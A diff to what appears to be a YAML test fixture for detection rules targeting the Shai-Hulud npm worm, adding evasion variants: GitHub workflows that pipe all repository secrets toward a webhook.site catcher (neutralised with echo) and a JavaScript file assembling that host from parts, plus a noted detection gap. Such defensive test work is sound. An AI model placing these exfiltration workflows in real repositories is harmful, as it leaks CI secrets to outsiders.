@@ -44,3 +44,43 @@ must_not_fire: [RC-AUTO-060, RC-AUTO-061, RC-AUTO-062]
 not_covered: >
   Running TruffleHog, publishing packages with stolen tokens and creating repositories
   happen at run time and are not visible as patterns in a repository.
+
+variants:
+  - id: curl-in-run
+    technique: The workflow step sends the secrets with curl inside run instead of env.
+    files:
+      .github/workflows/shai-hulud-workflow.yml: |
+        on: push
+        jobs:
+          process:
+            runs-on: ubuntu-latest
+            steps:
+              - run: echo curl -s -d "$CONTENTS" https://webhook.site/00000000-0000-0000-0000-000000000000 > /dev/null
+                env:
+                  CONTENTS: ${{ toJSON(secrets) }}
+  - id: host-without-scheme
+    technique: The host name stands alone in an environment variable; the URL is built in the shell.
+    files:
+      .github/workflows/shai-hulud-workflow.yml: |
+        on: push
+        jobs:
+          process:
+            runs-on: ubuntu-latest
+            steps:
+              - run: echo "would send CONTENTS to $HOST" > /dev/null
+                env:
+                  HOST: webhook.site
+                  CONTENTS: ${{ toJSON(secrets) }}
+  - id: joined-host
+    technique: The request catcher's host name is assembled from parts at run time.
+    files:
+      bundle.js: |
+        // Shape only: the target is named, nothing is collected or sent.
+        const report = { host: "dummy", tokens: [] };
+        const target = ["https:/", ["webhook", "site"].join("."), "00000000-0000-0000-0000-000000000000"].join("/");
+        module.exports = { report, target };
+known_gaps:
+  - variant: joined-host
+    reason: >
+      Host names assembled from parts at run time are not reconstructed; only literal
+      addresses are matched.
